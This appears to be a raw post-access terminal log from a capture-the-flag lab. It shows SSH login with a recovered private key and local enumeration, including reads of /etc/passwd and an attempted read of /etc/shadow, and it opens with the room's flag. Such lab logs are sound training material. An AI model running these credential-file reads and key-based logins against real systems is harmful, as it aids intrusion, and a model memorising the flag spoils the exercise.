

THM{0nly_th3m_5.5.2_D3sk}


```sh
┌──(kali㉿kali)-[~]
└─$ cd thm/annie 
                                                                                                                              
┌──(kali㉿kali)-[~/thm/annie]
└─$ ls -la
total 180
drwxrwxr-x  2 kali kali   4096 Jun 13 22:51 .
drwxr-xr-x 29 kali kali   4096 Jun 14 14:18 ..
-rw-------  1 kali kali   2635 Jun 13 22:36 id_rsa
-rw-rw-r--  1 kali kali 166999 Jun 13 22:49 redhead-annie-1389225_960_720.jpg
-rw-rw-r--  1 kali kali   3852 Jun 13 22:39 sshpass
                                                                                                                              
┌──(kali㉿kali)-[~/thm/annie]
└─$ ssh annie@10.10.159.237 -i ./id_rsa
The authenticity of host '10.10.159.237 (10.10.159.237)' can't be established.
ED25519 key fingerprint is SHA256:psjvqDXPWOqLQKlK8kRzSuqVtvSrfysL/TwPGnhb2Jw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:59: [hashed name]
    ~/.ssh/known_hosts:60: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.159.237' (ED25519) to the list of known hosts.
Enter passphrase for key './id_rsa': 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-173-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat May 14 16:03:44 2022 from 192.168.58.128
annie@desktop:~$ id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
annie@desktop:~$ sudo -l
[sudo] password for annie: 
Sorry, try again.
[sudo] password for annie: 
Sorry, try again.
[sudo] password for annie: 
sudo: 3 incorrect password attempts
annie@desktop:~$ ls -la /opt
total 8
drwxr-xr-x  2 root root 4096 Mar 23  2022 .
drwxr-xr-x 22 root root 4096 Mar 23  2022 ..
annie@desktop:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
annie@desktop:~$ ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwx------  3 annie annie 4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
annie@desktop:~$ ls -la *
-rw-rw-r-- 1 annie annie   23 Mar 23  2022 user.txt

Desktop:
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..

Documents:
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..

Downloads:
total 4580
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie    4096 Mar 23  2022 ..
-rw-r--r--  1 annie annie 4678844 Feb 17  2020 anydesk_5.5.2-1_amd64.deb

Music:
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..

Pictures:
total 172
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie   4096 Mar 23  2022 ..
-rw-rw-r--  1 annie annie 166999 Feb 27  2019 redhead-annie-1389225_960_720.jpg

Public:
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..

Templates:
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..

Videos:
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
annie@desktop:~$ ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwx------  3 annie annie 4096 Mar 23  2022 .local
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
annie@desktop:~$ cd ..
annie@desktop:/home$ ls -la
total 12
drwxr-xr-x  3 root  root  4096 Mar 23  2022 .
drwxr-xr-x 22 root  root  4096 Mar 23  2022 ..
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 annie
annie@desktop:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
annie:x:1000:1000:Annie Dash,,,:/home/annie:/bin/bash
cups-pk-helper:x:106:111:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:107:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
pulse:x:111:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
geoclue:x:114:122::/var/lib/geoclue:/usr/sbin/nologin
gdm:x:115:123:Gnome Display Manager:/var/lib/gdm3:/bin/false
sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
annie@desktop:/home$ ^C
annie@desktop:/home$ cat /etc/shadow
cat: /etc/shadow: Permission denied
annie@desktop:/home$ env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.18.21.236 40296 10.10.159.237 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
XDG_SESSION_ID=71
USER=annie
PWD=/home
HOME=/home/annie
SSH_CLIENT=10.18.21.236 40296 22
SSH_TTY=/dev/pts/0
MAIL=/var/mail/annie
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
LANGUAGE=en_US:
LOGNAME=annie
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env
OLDPWD=/home/annie
annie@desktop:/home$ ls -la
total 12
drwxr-xr-x  3 root  root  4096 Mar 23  2022 .
drwxr-xr-x 22 root  root  4096 Mar 23  2022 ..
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 annie
annie@desktop:/home$ cd ..
annie@desktop:/$ ls -la
total 970064
drwxr-xr-x  22 root root      4096 Mar 23  2022 .
drwxr-xr-x  22 root root      4096 Mar 23  2022 ..
drwxr-xr-x   2 root root      4096 Mar 23  2022 bin
drwxr-xr-x   3 root root      4096 Mar 23  2022 boot
drwxr-xr-x  17 root root      3680 Jun 18 04:07 dev
drwxr-xr-x 109 root root      4096 May 14  2022 etc
drwxr-xr-x   3 root root      4096 Mar 23  2022 home
lrwxrwxrwx   1 root root        34 Mar 23  2022 initrd.img -> boot/initrd.img-4.15.0-173-generic
lrwxrwxrwx   1 root root        33 Mar 23  2022 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x  18 root root      4096 Mar 23  2022 lib
drwxr-xr-x   2 root root      4096 Mar 23  2022 lib64
drwx------   2 root root     16384 Mar 23  2022 lost+found
drwxr-xr-x   4 root root      4096 Mar 23  2022 media
drwxr-xr-x   2 root root      4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root      4096 Mar 23  2022 opt
dr-xr-xr-x 137 root root         0 Jun 18 04:06 proc
drwx------   5 root root      4096 Mar 23  2022 root
drwxr-xr-x  21 root root       640 Jun 18 04:41 run
drwxr-xr-x   2 root root     12288 Mar 23  2022 sbin
drwxr-xr-x   2 root root      4096 Feb  3  2020 srv
-rw-------   1 root root 993244160 Mar 23  2022 swapfile
dr-xr-xr-x  13 root root         0 Jun 18 04:06 sys
drwxrwxrwt  14 root root      4096 Jun 18 04:55 tmp
drwxr-xr-x  10 root root      4096 Mar 23  2022 usr
drwxr-xr-x  12 root root      4096 Mar 23  2022 var
lrwxrwxrwx   1 root root        31 Mar 23  2022 vmlinuz -> boot/vmlinuz-4.15.0-173-generic
lrwxrwxrwx   1 root root        30 Mar 23  2022 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
annie@desktop:/$ cd run
annie@desktop:/run$ ls -la
total 28
drwxr-xr-x 21 root  root   640 Jun 18 04:41 .
drwxr-xr-x 22 root  root  4096 Mar 23  2022 ..
-rw-------  1 root  root     0 Jun 18 04:07 agetty.reload
-rw-------  1 root  root     0 Jun 18 04:07 apport.lock
drwxr-xr-x  2 avahi avahi   80 Jun 18 04:07 avahi-daemon
drwxr-xr-x  3 root  root    60 Jun 18 04:10 boltd
drwxr-xr-x  2 root  root    80 Jun 18 04:07 console-setup
-rw-r--r--  1 root  root     4 Jun 18 04:07 crond.pid
----------  1 root  root     0 Jun 18 04:07 crond.reboot
drwxr-xr-x  2 root  root    60 Jun 18 04:07 dbus
drwx--x--x  3 root  gdm     60 Jun 18 04:07 gdm3
-rw-r--r--  1 root  root     4 Jun 18 04:07 gdm3.pid
lrwxrwxrwx  1 root  root    25 Jun 18 04:07 initctl -> /run/systemd/initctl/fifo
drwxr-xr-x  2 root  root    80 Jun 18 04:06 initramfs
drwxrwxrwt  3 root  root    60 Jun 18 04:07 lock
drwxr-xr-x  2 root  root    40 Jun 18 04:07 log
-rw-r--r--  1 root  root   297 Jun 18 04:41 motd.dynamic
drwxr-xr-x  2 root  root    60 Jun 18 04:07 mount
drwxr-xr-x  4 root  root    80 Jun 18 04:07 NetworkManager
-rw-r--r--  1 root  root     3 Jun 18 04:07 rsyslogd.pid
drwxr-xr-x  2 root  root    40 Jun 18 04:07 sendsigs.omit.d
lrwxrwxrwx  1 root  root     8 Jun 18 04:07 shm -> /dev/shm
drwxr-xr-x  2 root  root    40 Jun 18 04:07 sshd
-rw-r--r--  1 root  root     4 Jun 18 04:07 sshd.pid
drwx--x--x  3 root  root    60 Jun 18 04:07 sudo
drwxr-xr-x 22 root  root   500 Jun 18 04:08 systemd
drwxr-xr-x  2 root  root    60 Jun 18 04:07 tmpfiles.d
drwxr-xr-x  7 root  root   160 Jun 18 04:07 udev
drwx------  2 root  root    40 Jun 18 04:07 udisks2
drwxr-xr-x  4 root  root    80 Jun 18 04:41 user
-rw-rw-r--  1 root  utmp  1536 Jun 18 04:41 utmp
drwxr-xr-x  2 root  root    60 Jun 18 04:07 uuidd
annie@desktop:/run$ cd 1000
-bash: cd: 1000: No such file or directory
annie@desktop:/run$ cd ..
annie@desktop:/$ ls -la
total 970064
drwxr-xr-x  22 root root      4096 Mar 23  2022 .
drwxr-xr-x  22 root root      4096 Mar 23  2022 ..
drwxr-xr-x   2 root root      4096 Mar 23  2022 bin
drwxr-xr-x   3 root root      4096 Mar 23  2022 boot
drwxr-xr-x  17 root root      3680 Jun 18 04:07 dev
drwxr-xr-x 109 root root      4096 May 14  2022 etc
drwxr-xr-x   3 root root      4096 Mar 23  2022 home
lrwxrwxrwx   1 root root        34 Mar 23  2022 initrd.img -> boot/initrd.img-4.15.0-173-generic
lrwxrwxrwx   1 root root        33 Mar 23  2022 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x  18 root root      4096 Mar 23  2022 lib
drwxr-xr-x   2 root root      4096 Mar 23  2022 lib64
drwx------   2 root root     16384 Mar 23  2022 lost+found
drwxr-xr-x   4 root root      4096 Mar 23  2022 media
drwxr-xr-x   2 root root      4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root      4096 Mar 23  2022 opt
dr-xr-xr-x 137 root root         0 Jun 18 04:06 proc
drwx------   5 root root      4096 Mar 23  2022 root
drwxr-xr-x  21 root root       640 Jun 18 04:41 run
drwxr-xr-x   2 root root     12288 Mar 23  2022 sbin
drwxr-xr-x   2 root root      4096 Feb  3  2020 srv
-rw-------   1 root root 993244160 Mar 23  2022 swapfile
dr-xr-xr-x  13 root root         0 Jun 18 04:55 sys
drwxrwxrwt  14 root root      4096 Jun 18 04:57 tmp
drwxr-xr-x  10 root root      4096 Mar 23  2022 usr
drwxr-xr-x  12 root root      4096 Mar 23  2022 var
lrwxrwxrwx   1 root root        31 Mar 23  2022 vmlinuz -> boot/vmlinuz-4.15.0-173-generic
lrwxrwxrwx   1 root root        30 Mar 23  2022 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
annie@desktop:/$ cd var
annie@desktop:/var$ ls -la
total 48
drwxr-xr-x 12 root root   4096 Mar 23  2022 .
drwxr-xr-x 22 root root   4096 Mar 23  2022 ..
drwxr-xr-x  2 root root   4096 May 11  2022 backups
drwxr-xr-x 12 root root   4096 Mar 23  2022 cache
drwxrwxrwt  2 root root   4096 Jun 18 04:10 crash
drwxr-xr-x 49 root root   4096 Mar 23  2022 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Mar 23  2022 lock -> /run/lock
drwxrwxr-x  8 root syslog 4096 Jun 18 04:35 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Mar 23  2022 run -> /run
drwxr-xr-x  4 root root   4096 Mar 23  2022 spool
drwxrwxrwt  8 root root   4096 Jun 18 04:10 tmp
annie@desktop:/var$ ls -la backups
total 60
drwxr-xr-x  2 root root  4096 May 11  2022 .
drwxr-xr-x 12 root root  4096 Mar 23  2022 ..
-rw-r--r--  1 root root 51389 Mar 23  2022 apt.extended_states.0
annie@desktop:/var$ ls -la cache
total 48
drwxr-xr-x 12 root root 4096 Mar 23  2022 .
drwxr-xr-x 12 root root 4096 Mar 23  2022 ..
drwxr-xr-x  2 root root 4096 Sep 27  2018 apparmor
drwxr-xr-x  3 root root 4096 May 11  2022 apt
drwxr-xr-x  2 root root 4096 Mar 23  2022 cracklib
drwxr-xr-x  2 root root 4096 Mar 23  2022 debconf
drwxr-xr-x  2 root root 4096 Mar 23  2022 dictionaries-common
drwxr-xr-x  2 root root 4096 Mar 23  2022 fontconfig
drwxr-xr-x  2 root root 4096 Oct 27  2020 gdm
drwx------  2 root root 4096 Mar 23  2022 ldconfig
drwxr-xr-x  2 man  man  4096 Jun 18 04:22 man
-rw-r--r--  1 root root    0 Mar 23  2022 motd-news
drwxr-xr-x  3 root root 4096 Mar 23  2022 PackageKit
annie@desktop:/var$ ls -la log
total 4580
drwxrwxr-x   8 root   syslog             4096 Jun 18 04:35 .
drwxr-xr-x  12 root   root               4096 Mar 23  2022 ..
-rwxrwxrwx   1 root   root            1012345 Jun 18 04:58 anydesk.trace
-rw-r-----   1 root   adm               18805 Jun 18 04:10 apport.log
drwxr-xr-x   2 root   root               4096 May 11  2022 apt
-rw-r-----   1 syslog adm               47883 Jun 18 04:58 auth.log
-rw-rw----   1 root   utmp                  0 Feb  3  2020 btmp
drwxr-xr-x   2 root   root               4096 Jan 24  2020 dist-upgrade
-rw-r--r--   1 root   root              32032 Mar 23  2022 faillog
drwx--x--x   2 root   gdm                4096 Oct 27  2020 gdm3
drwxr-xr-x   3 root   root               4096 Mar 23  2022 installer
drwxr-sr-x+  3 root   systemd-journal    4096 Mar 23  2022 journal
-rw-r-----   1 syslog adm              411894 Jun 18 04:13 kern.log
-rw-rw-r--   1 root   utmp             292292 Jun 18 04:41 lastlog
-rw-r-----   1 syslog adm             3038973 Jun 18 04:58 syslog
-rw-------   1 root   root              64064 Mar 23  2022 tallylog
-rw-------   1 root   root                157 Jun 18 04:35 ubuntu-advantage-timer.log
drwxr-xr-x   2 root   root               4096 May 11  2022 vmware
-rw-rw-r--   1 root   utmp              28800 Jun 18 04:41 wtmp
annie@desktop:/var$ cd ..
annie@desktop:/$ ls -la
total 970064
drwxr-xr-x  22 root root      4096 Mar 23  2022 .
drwxr-xr-x  22 root root      4096 Mar 23  2022 ..
drwxr-xr-x   2 root root      4096 Mar 23  2022 bin
drwxr-xr-x   3 root root      4096 Mar 23  2022 boot
drwxr-xr-x  17 root root      3680 Jun 18 04:07 dev
drwxr-xr-x 109 root root      4096 May 14  2022 etc
drwxr-xr-x   3 root root      4096 Mar 23  2022 home
lrwxrwxrwx   1 root root        34 Mar 23  2022 initrd.img -> boot/initrd.img-4.15.0-173-generic
lrwxrwxrwx   1 root root        33 Mar 23  2022 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x  18 root root      4096 Mar 23  2022 lib
drwxr-xr-x   2 root root      4096 Mar 23  2022 lib64
drwx------   2 root root     16384 Mar 23  2022 lost+found
drwxr-xr-x   4 root root      4096 Mar 23  2022 media
drwxr-xr-x   2 root root      4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root      4096 Mar 23  2022 opt
dr-xr-xr-x 137 root root         0 Jun 18 04:06 proc
drwx------   5 root root      4096 Mar 23  2022 root
drwxr-xr-x  21 root root       640 Jun 18 04:41 run
drwxr-xr-x   2 root root     12288 Mar 23  2022 sbin
drwxr-xr-x   2 root root      4096 Feb  3  2020 srv
-rw-------   1 root root 993244160 Mar 23  2022 swapfile
dr-xr-xr-x  13 root root         0 Jun 18 04:55 sys
drwxrwxrwt  14 root root      4096 Jun 18 04:58 tmp
drwxr-xr-x  10 root root      4096 Mar 23  2022 usr
drwxr-xr-x  12 root root      4096 Mar 23  2022 var
lrwxrwxrwx   1 root root        31 Mar 23  2022 vmlinuz -> boot/vmlinuz-4.15.0-173-generic
lrwxrwxrwx   1 root root        30 Mar 23  2022 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
annie@desktop:/$ cd mail
-bash: cd: mail: No such file or directory
annie@desktop:/$ ls -la
total 970064
drwxr-xr-x  22 root root      4096 Mar 23  2022 .
drwxr-xr-x  22 root root      4096 Mar 23  2022 ..
drwxr-xr-x   2 root root      4096 Mar 23  2022 bin
drwxr-xr-x   3 root root      4096 Mar 23  2022 boot
drwxr-xr-x  17 root root      3680 Jun 18 04:07 dev
drwxr-xr-x 109 root root      4096 May 14  2022 etc
drwxr-xr-x   3 root root      4096 Mar 23  2022 home
lrwxrwxrwx   1 root root        34 Mar 23  2022 initrd.img -> boot/initrd.img-4.15.0-173-generic
lrwxrwxrwx   1 root root        33 Mar 23  2022 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x  18 root root      4096 Mar 23  2022 lib
drwxr-xr-x   2 root root      4096 Mar 23  2022 lib64
drwx------   2 root root     16384 Mar 23  2022 lost+found
drwxr-xr-x   4 root root      4096 Mar 23  2022 media
drwxr-xr-x   2 root root      4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root      4096 Mar 23  2022 opt
dr-xr-xr-x 137 root root         0 Jun 18 04:06 proc
drwx------   5 root root      4096 Mar 23  2022 root
drwxr-xr-x  21 root root       640 Jun 18 04:41 run
drwxr-xr-x   2 root root     12288 Mar 23  2022 sbin
drwxr-xr-x   2 root root      4096 Feb  3  2020 srv
-rw-------   1 root root 993244160 Mar 23  2022 swapfile
dr-xr-xr-x  13 root root         0 Jun 18 04:55 sys
drwxrwxrwt  14 root root      4096 Jun 18 04:59 tmp
drwxr-xr-x  10 root root      4096 Mar 23  2022 usr
drwxr-xr-x  12 root root      4096 Mar 23  2022 var
lrwxrwxrwx   1 root root        31 Mar 23  2022 vmlinuz -> boot/vmlinuz-4.15.0-173-generic
lrwxrwxrwx   1 root root        30 Mar 23  2022 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
annie@desktop:/$ cd var
annie@desktop:/var$ ls -la
total 48
drwxr-xr-x 12 root root   4096 Mar 23  2022 .
drwxr-xr-x 22 root root   4096 Mar 23  2022 ..
drwxr-xr-x  2 root root   4096 May 11  2022 backups
drwxr-xr-x 12 root root   4096 Mar 23  2022 cache
drwxrwxrwt  2 root root   4096 Jun 18 04:10 crash
drwxr-xr-x 49 root root   4096 Mar 23  2022 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Mar 23  2022 lock -> /run/lock
drwxrwxr-x  8 root syslog 4096 Jun 18 04:35 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Mar 23  2022 run -> /run
drwxr-xr-x  4 root root   4096 Mar 23  2022 spool
drwxrwxrwt  8 root root   4096 Jun 18 04:10 tmp
annie@desktop:/var$ ls -la mail
total 8
drwxrwsr-x  2 root mail 4096 Feb  3  2020 .
drwxr-xr-x 12 root root 4096 Mar 23  2022 ..
annie@desktop:/var$ cd ..
annie@desktop:/$ ls -la
total 970064
drwxr-xr-x  22 root root      4096 Mar 23  2022 .
drwxr-xr-x  22 root root      4096 Mar 23  2022 ..
drwxr-xr-x   2 root root      4096 Mar 23  2022 bin
drwxr-xr-x   3 root root      4096 Mar 23  2022 boot
drwxr-xr-x  17 root root      3680 Jun 18 04:07 dev
drwxr-xr-x 109 root root      4096 May 14  2022 etc
drwxr-xr-x   3 root root      4096 Mar 23  2022 home
lrwxrwxrwx   1 root root        34 Mar 23  2022 initrd.img -> boot/initrd.img-4.15.0-173-generic
lrwxrwxrwx   1 root root        33 Mar 23  2022 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x  18 root root      4096 Mar 23  2022 lib
drwxr-xr-x   2 root root      4096 Mar 23  2022 lib64
drwx------   2 root root     16384 Mar 23  2022 lost+found
drwxr-xr-x   4 root root      4096 Mar 23  2022 media
drwxr-xr-x   2 root root      4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root      4096 Mar 23  2022 opt
dr-xr-xr-x 137 root root         0 Jun 18 04:06 proc
drwx------   5 root root      4096 Mar 23  2022 root
drwxr-xr-x  21 root root       640 Jun 18 04:41 run
drwxr-xr-x   2 root root     12288 Mar 23  2022 sbin
drwxr-xr-x   2 root root      4096 Feb  3  2020 srv
-rw-------   1 root root 993244160 Mar 23  2022 swapfile
dr-xr-xr-x  13 root root         0 Jun 18 04:55 sys
drwxrwxrwt  14 root root      4096 Jun 18 04:59 tmp
drwxr-xr-x  10 root root      4096 Mar 23  2022 usr
drwxr-xr-x  12 root root      4096 Mar 23  2022 var
